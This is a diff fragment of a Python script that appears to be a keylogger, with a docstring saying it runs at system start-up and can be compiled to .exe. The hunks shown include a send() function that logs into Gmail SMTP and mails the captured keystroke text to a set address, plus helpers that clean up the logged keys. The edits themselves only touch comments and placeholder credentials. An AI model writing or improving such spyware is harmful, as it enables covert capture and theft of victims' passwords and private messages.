@@ -1,5 +1,5 @@
 """
-setted by @housUnus
+Made by #HousUnus#
 
 more functionalities
 
@@ -7,7 +7,7 @@ txt sended as string traited and clean
 
 run with system start up
 
-big greeting to "LET'S CHANGE OUR MONTALITY" Familly 
+* You can convert the .py to .exe from a 32bits system and it will work fine for other versions
 
 """
 
@@ -56,8 +56,8 @@ def send():
   try:
     server = smtplib.SMTP('smtp.gmail.com', 587)
     server.starttls()
-    server.login("email to send from", "PASSWORD")
-    server.sendmail("email to send from", "email to send to it", link())
+    server.login("*email to send from", "PASSWORD")
+    server.sendmail("*email to send from", "email to send to it", link())
     server.quit()
     sendedToday = True
     return
@@ -81,7 +81,7 @@ def link():
     msg = Upper(msg)
     msg = backD(msg)
     return msg
-#remove the if the key saved was delete
+#remove the file if the key saved was delete
 def backD(msg):
     la = [x for x in msg]
     for j in range(len(la)) :
@@ -92,7 +92,7 @@ def backD(msg):
                             la.pop(bef)
                             break
     return "".join(la)
-#make the carachter after the KeyLock as Upper its not so efficient
+#make the carachter after the KeyLock founde as Upper its not so efficient
 def Upper(msg):
     la = [x for x in msg]
     count =1
